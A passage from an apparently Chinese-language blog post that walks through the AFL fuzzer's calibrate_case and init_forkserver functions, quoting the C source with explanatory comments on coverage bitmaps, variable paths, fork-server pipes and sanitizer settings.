<span class="title function_">calibrate_case</span><span class="params">(<span class="type">char</span> **argv, <span class="keyword">struct</span> queue_entry *q, u8 *use_mem,</span></span><br><span class="line"><span class="params">                         u32 handicap, u8 from_queue)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8 fault = <span class="number">0</span>, new_bits = <span class="number">0</span>, var_detected = <span class="number">0</span>, hnb = <span class="number">0</span>,</span><br><span class="line">     first_run = (q-&gt;exec_cksum == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc = stage_cur, old_sm = stage_max;</span><br><span class="line">  u32 use_tmout = exec_tmout;</span><br><span class="line">  u8 *old_sn = stage_name;</span><br></pre></td></tr></table></figure><p>然后判断testcase时是否来自queue，或者是否是resume一个fuzz job，也即，是否是一个已经运行过一次的fuzz，然后再接着运行，如果是，则更新use_tmout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!from_queue || resuming_fuzz)</span><br><span class="line">  use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                  exec_tmout * CAL_TMOUT_PERC / <span class="number">100</span>);</span><br><span class="line">                  <span class="comment">// 提升tmout的值</span></span><br></pre></td></tr></table></figure><p>更新cal_failed 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q-&gt;cal_failed++;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stage_name = <span class="string">&quot;calibration&quot;</span>;</span><br><span class="line"><span class="comment">// 更新stage_name </span></span><br><span class="line">stage_max = fast_cal ? <span class="number">3</span> : CAL_CYCLES;</span><br><span class="line"><span class="comment">// 设置cal的最大论数，如果需要fast_cal则设置最大3论</span></span><br></pre></td></tr></table></figure><p>确保没有forkserver并且非dump_mode时，创建一个forkserver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  init_forkserver(argv);</span><br></pre></td></tr></table></figure><p>什么是dump_mode呢？</p><p>dump_mode即没有插桩和确定性(deterministic)变异阶段的模式</p><p><code>q-&gt;exec_cksum</code> 初始时为0，因此此处是用来判断是否是初次运行</p><p>virgin_bits是一个bitmap，用来记录没有触及的block</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (q-&gt;exec_cksum)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 如果不是初次运行</span></span><br><span class="line">  <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">  </span><br><span class="line">  hnb = has_new_bits(virgin_bits);</span><br><span class="line">  <span class="keyword">if</span> (hnb &gt; new_bits)</span><br><span class="line">    new_bits = hnb;</span><br><span class="line">    <span class="comment">// 更新new_bits数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置起始时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start_us = get_cur_time_us();</span><br></pre></td></tr></table></figure><p>接下来进入循环轮次:</p><p>这里的可变分支，指的是，对于同样的输入，可能可以到达也可能不能到达的分支。</p><p>在循环中，通过 <code>run_target</code>  真正让目标程序开始运行，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="comment">// 循环轮次由前面的代码确定</span></span><br><span class="line">   u32 cksum;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq))</span><br><span class="line">     show_stats();</span><br><span class="line">   <span class="comment">// 如果不是第一次运行 并且state_cur 隔 stats_update_freq 次</span></span><br><span class="line">   <span class="comment">// 则show_stats </span></span><br><span class="line">   write_to_testcase(use_mem, q-&gt;len);</span><br><span class="line">   <span class="comment">// 将testcase写入out_file </span></span><br><span class="line">   fault = run_target(argv, use_tmout);</span><br><span class="line">   <span class="comment">// 运行目标程序</span></span><br><span class="line">   <span class="comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span></span><br><span class="line"><span class="comment">      we want to bail out quickly. */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (stop_soon || fault != crash_mode)</span><br><span class="line">     <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">   <span class="comment">// 如果收到终止signal </span></span><br><span class="line">   <span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits))</span><br><span class="line">   &#123;</span><br><span class="line">     fault = FAULT_NOINST;</span><br><span class="line">     <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">   <span class="comment">// 计算bitmap的hash </span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (q-&gt;exec_cksum != cksum)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="comment">// bitmap发生变化</span></span><br><span class="line">   <span class="comment">// 一般在第一次运行，或者在同样的参数下，分支可变的情形</span></span><br><span class="line">     hnb = has_new_bits(virgin_bits);</span><br><span class="line">     <span class="comment">// 计算virgin_bits的更新</span></span><br><span class="line">     <span class="keyword">if</span> (hnb &gt; new_bits)</span><br><span class="line">       new_bits = hnb;</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">if</span> (q-&gt;exec_cksum)</span><br><span class="line">     &#123;</span><br><span class="line">     <span class="comment">// 如果是分支可变的情形</span></span><br><span class="line">       u32 i;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">       &#123;</span><br><span class="line"><span class="comment">// 循环遍历，找到可变的region，如果找到了，就延长轮次</span></span><br><span class="line"><span class="comment">// 以便进行更多的遍历</span></span><br><span class="line">         <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i])</span><br><span class="line">         &#123;</span><br><span class="line">           var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">           stage_max = CAL_CYCLES_LONG;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       var_detected = <span class="number">1</span>;</span><br><span class="line">       <span class="comment">// 检测到可变</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">     <span class="comment">// 如果是第一次运行</span></span><br><span class="line">       q-&gt;exec_cksum = cksum;</span><br><span class="line">       <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>增加总运行时间和轮次计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stop_us = get_cur_time_us();</span><br><span class="line"></span><br><span class="line">total_cal_us += stop_us - start_us;</span><br><span class="line">total_cal_cycles += stage_max;</span><br></pre></td></tr></table></figure><p>更新queue的相关成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">q-&gt;exec_us = (stop_us - start_us) / stage_max;</span><br><span class="line"><span class="comment">// 平均每轮的执行时间</span></span><br><span class="line">q-&gt;bitmap_size = count_bytes(trace_bits);</span><br><span class="line">q-&gt;handicap = handicap;</span><br><span class="line">q-&gt;cal_failed = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 将之前的设置的1还原为0，表示没有失败</span></span><br></pre></td></tr></table></figure><p>还需要用 <code>update_bitmap_score</code> 更新bitmap的分数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">update_bitmap_score(q);</span><br></pre></td></tr></table></figure><p>如果没有产生新bit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits)</span><br><span class="line">  fault = FAULT_NOBITS;</span><br></pre></td></tr></table></figure><p>进入最后的收尾的处理阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// has_new_bits在存在new bit下的返回值就是2</span></span><br><span class="line">    q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 有新的覆盖率</span></span><br><span class="line">    queued_with_cov++;</span><br><span class="line">    <span class="comment">// 有新覆盖率的queue加一</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark variable paths. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (var_detected)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 计算可变bytes的数量</span></span><br><span class="line">    var_byte_count = count_bytes(var_bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;var_behavior)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">// 如果可变</span></span><br><span class="line">      mark_as_variable(q);</span><br><span class="line">      <span class="comment">// 通过创建一个variable_behavior文件标记其可变</span></span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 恢复之前的stage相关的全局变量</span></span><br><span class="line">  stage_name = old_sn;</span><br><span class="line">  stage_cur = old_sc;</span><br><span class="line">  stage_max = old_sm;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!first_run)</span><br><span class="line">    show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="init-forkserver">init_forkserver</h4><p>用来创建一个forkserver，避免频繁的execve</p><p>首先创建两个管道，<code>st_pipe</code> 和 <code>ctl_pipe</code> ， 分别用于传递状态和命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">init_forkserver</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  s32 rlen;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe))</span><br><span class="line">    PFATAL(<span class="string">&quot;pipe() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>接下来通过fork产生一个子进程，父进程是fuzzer，子进程是forkserver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">forksrv_pid = fork(); </span><br><span class="line"><span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过pid控制子进程<strong>进入</strong>如下if语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!forksrv_pid)</span><br><span class="line"> &#123; </span><br><span class="line">   <span class="comment">// 省略部分对于openbsd的特殊处理</span></span><br><span class="line">   setsid();</span><br><span class="line">   <span class="comment">// 通过setsid使得子进程成为一个单独进程组</span></span><br><span class="line">   dup2(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">   dup2(dev_null_fd, <span class="number">2</span>);</span><br><span class="line">   <span class="comment">// 将标准输出和标准错误重定向到/dev/null </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有设置输出文件 </span></span><br><span class="line"><span class="comment">// 将标准输入重定向到此文件</span></span><br><span class="line"><span class="comment">// 此处笔者还没有搞清楚为什么</span></span><br><span class="line">   <span class="keyword">if</span> (out_file)</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">     dup2(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">     dup2(out_fd, <span class="number">0</span>);</span><br><span class="line">     close(out_fd);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接下来设置状态和控制管道的文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>)</span><br><span class="line">  PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>关闭多余描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">close(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">close(st_pipe[<span class="number">0</span>]);</span><br><span class="line">close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">close(out_dir_fd);</span><br><span class="line">close(dev_null_fd);</span><br><span class="line">close(dev_urandom_fd);</span><br><span class="line">close(fileno(plot_file));</span><br></pre></td></tr></table></figure><p>设置延迟绑定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!getenv(<span class="string">&quot;LD_BIND_LAZY&quot;</span>))</span><br><span class="line">  setenv(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>设置ASAN相关环境变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;allocator_may_return_null=1&quot;</span>,</span><br><span class="line">       <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>设置MSAN相关环境变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                                                          <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                                                          <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                                                          <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                                                          <span class="string">&quot;msan_track_origins=0&quot;</span>,</span><br><span class="line">       <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>通过execv执行子进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execv(target_path, argv);</span><br></pre></td></tr></table></figure><p>此时之后目标程序的运行空间会覆盖当前运行时</p><p>如果execv失败，通知父进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  *(u32 *)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子进程if结束</p><p>父进程通过状态管道读取四个字节，来判断子进程的开始，并针对性完成错误处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">  close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd = st_pipe[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    FATAL(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="number">500</span> &amp;&amp; uses_asan)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you have a\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    restrictive memory limit configured, this is expected; please read\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>,</span><br><span class="line">           doc_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mem_limit)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Whoops, the target binary crashed suddenly, before receiving any 